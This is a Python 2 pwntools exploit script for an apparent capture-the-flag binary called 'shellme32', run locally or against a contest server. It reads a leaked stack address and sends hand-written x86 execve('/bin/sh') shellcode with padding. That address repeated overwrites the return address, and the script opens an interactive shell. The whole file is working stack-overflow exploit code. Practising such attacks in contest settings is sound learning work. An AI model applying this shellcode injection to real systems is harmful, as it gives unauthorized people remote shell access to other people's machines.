#!/usr/bin/env python2
from pwn import *
from mypwntools import * # ~/workspace/tools/mypwntools/
import logging
import coloredlogs
# shellcodes['binsh32']
# shellcodes['binshx86_64']
# gethex(string)

coloredlogs.install()
log = logging.getLogger("Exploit")

#context.log_level = 'debug'
context.terminal = ['alacritty', '-e', 'sh', '-c']

BINARY = "./shellme32"
HOST, PORT = 'chal.tuctf.com', 30506
LIBC_PATH = '/usr/lib/libc.so.6'

GDB_SETUP = """
set follow-fork-mode child
# c
"""

if '--live' not in sys.argv:
    p = process(BINARY)
    if '--debug' in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)

if LIBC_PATH:
    libc = ELF(LIBC_PATH)

a = p.recv()
location = gethex(a)
shellcode =  shellcraft.i386.linux.sh()
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
while len(payload) < 0x20:
    payload += 'A'
print(hex(location))
print(payload)
payload += p32(location) * 4

p.sendline(payload)

p.interactive()

